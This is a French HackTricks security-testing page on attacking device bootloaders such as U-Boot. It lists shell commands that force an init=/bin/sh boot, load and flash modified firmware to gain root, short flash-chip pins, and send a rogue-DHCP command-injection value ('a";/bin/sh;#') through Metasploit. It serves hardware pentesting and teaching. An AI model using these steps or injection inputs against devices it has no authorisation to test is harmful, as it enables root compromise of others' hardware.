<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Copié de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Lors de la modification du démarrage de l'appareil et des bootloaders tels que U-boot, tentez ce qui suit :

* Essayez d'accéder à l'interpréteur shell du bootloader en appuyant sur "0", espace ou d'autres "codes magiques" identifiés pendant le démarrage.
* Modifiez les configurations pour exécuter une commande shell telle que l'ajout de '`init=/bin/sh`' à la fin des arguments de démarrage
* `#printenv`
* `#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh`
* `#saveenv`
* `#boot`
* Configurez un serveur tftp pour charger des images sur le réseau localement depuis votre poste de travail. Assurez-vous que l'appareil a accès au réseau.
* `#setenv ipaddr 192.168.2.2 #adresse IP locale de l'appareil`
* `#setenv serverip 192.168.2.1 #adresse IP du serveur tftp`
* `#saveenv`
* `#reset`
* `#ping 192.168.2.1 #vérifiez si l'accès réseau est disponible`
* `#tftp ${loadaddr} uImage-3.6.35 #loadaddr prend deux arguments : l'adresse où charger le fichier et le nom du fichier de l'image sur le serveur TFTP`
* Utilisez `ubootwrite.py` pour écrire l'image uboot et pousser un firmware modifié pour obtenir un accès root
* Vérifiez si les fonctionnalités de débogage sont activées, telles que :
* journalisation détaillée
* chargement de noyaux arbitraires
* démarrage à partir de sources non fiables
* \*Utilisez avec prudence : Connectez une broche à la terre, observez la séquence de démarrage de l'appareil, avant que le noyau ne se décompresse, court-circuitez/connectez la broche à la terre à une broche de données (DO) sur une puce flash SPI
* \*Utilisez avec prudence : Connectez une broche à la terre, observez la séquence de démarrage de l'appareil, avant que le noyau ne se décompresse, court-circuitez/connectez la broche à la terre aux broches 8 et 9 de la puce flash NAND au moment où U-boot décompresse l'image UBI
* \*Consultez la fiche technique de la puce flash NAND avant de court-circuiter les broches
* Configurez un serveur DHCP malveillant avec des paramètres malicieux comme entrée pour qu'un appareil les ingère pendant un démarrage PXE
* Utilisez le serveur auxiliaire DHCP de Metasploit (MSF) et modifiez le paramètre '`FILENAME`' avec des commandes d'injection de commande telles que `‘a";/bin/sh;#’` pour tester la validation des entrées pour les procédures de démarrage de l'appareil.

\*Test de sécurité matérielle


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
